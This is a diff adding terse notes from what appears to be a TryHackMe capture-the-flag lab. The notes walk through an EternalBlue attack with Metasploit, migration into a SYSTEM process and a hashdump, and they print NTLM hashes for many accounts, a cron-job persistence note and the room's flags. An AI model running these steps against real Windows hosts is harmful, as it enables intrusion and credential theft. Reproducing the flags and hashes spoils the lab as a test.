@@ -84,3 +84,73 @@ run
 
 
 *edit cron backup job to run shell.exe
+
+
+
+
+
+
+
+
+
+					Eternalblue
+					
+>use exploit/windows/smb/ms17_010_psexec
+
+
+>set options
+
+
+>ps
+
+352   688   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
+
+
+>migrate 352
+
+
+>hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e6e91387c38f792316d246f921a191b7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cccf565409786326c25bebdebff2ea9:::
+mykull:1106:aad3b435b51404eeaad3b435b51404ee:81ff2521e6bb32afb90fa2db086850bf:::
+poki:1107:aad3b435b51404eeaad3b435b51404ee:2cb8a0bb2846c9b077f411f06e8c2c64:::
+lily:1108:aad3b435b51404eeaad3b435b51404ee:e689a8b8d56e976d5e707bc3a4bcb2dc:::
+toast:1109:aad3b435b51404eeaad3b435b51404ee:5aceb388e109e9be328dcece757268b2:::
+scarra:1110:aad3b435b51404eeaad3b435b51404ee:9613f108e7871f2c808d67b50ec9acd3:::
+yvonne:1111:aad3b435b51404eeaad3b435b51404ee:e6fab1566ee19c96fb5222572d7566bc:::
+fed:1112:aad3b435b51404eeaad3b435b51404ee:b817f21568ac99b0f2125d1cf7d719ff:::
+SVC_ROBOTARMY:1113:aad3b435b51404eeaad3b435b51404ee:428ce6b6d82dfa21fcde1b16cced6276:::
+larry:1114:aad3b435b51404eeaad3b435b51404ee:e96a7d246a64a3488c04d81bb1caa3d0:::
+OFFLINE$:1001:aad3b435b51404eeaad3b435b51404ee:249a558a630216fefc3f12f00070c71a:::
+
+
+>echo "" > C:\Users\Administrator\king-server\king.txt
+
+
+*flags
+
+Administrator
+THM{95B20C5626EB94E68812FF93A6F8B7A0}
+
+fed
+THM{02592D82BBA02DE324F72496B393D16F}
+
+lily
+THM{89F288757F4D0693C99B007855FC075E}
+
+mykull
+THM{44EF79C7857DAFEC76F6E3F0F3263060}
+
+poki
+THM{1A44E1ED498294F9AA218F1742A160AA}
+
+scarra
+THM{C7914ACADABBCA1DE6287BD624953BA6}
+
+toast
+THM{4F2900F2FDFAF3F77BD599391218F49F}
+
+yvonne
+THM{7878847D55C22F58E3A702FC10D98C54}
